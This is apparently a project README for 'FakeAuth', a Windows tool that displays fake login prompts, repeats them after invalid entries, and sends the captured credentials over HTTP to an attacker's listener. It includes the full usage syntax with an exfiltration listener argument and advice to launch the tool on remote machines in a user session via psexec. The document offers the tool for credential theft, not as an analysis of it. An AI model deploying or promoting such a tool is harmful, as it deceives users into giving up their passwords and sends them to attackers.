# FakeAuth

FakeAuth is a tool that prompts for user credentials and exfiltrates it with HTTP protocol.

Inspired by following projects
1) hlldz's PICKL3 [https://github.com/hlldz/pickl3](https://github.com/hlldz/pickl3)

Expect to find dirty code and some bugs, this is some of first versions ;)

## Installation

No special requirements


## Usage

```
Usage: FakeAuth.exe <type> <count> <title> <message> <listener>
type     (integer) -> Prompt Style (1,2)
count    (long)    -> How many prompts after invalid Credentials (0,1,2,..,n 0=unlimited)
title    (string)  -> Prompt title (type=1 only)
message  (string)  -> Window message
listener (string)  -> HTTP exfiltration listener (10.0.0.0:80), if not specified print stdout
```

Best way to use is to start on a remote machines in a user session. (psexec or other helpers)

## Contact

@atn1ght1 Twitter

## License
[MIT](https://choosealicense.com/licenses/mit/)
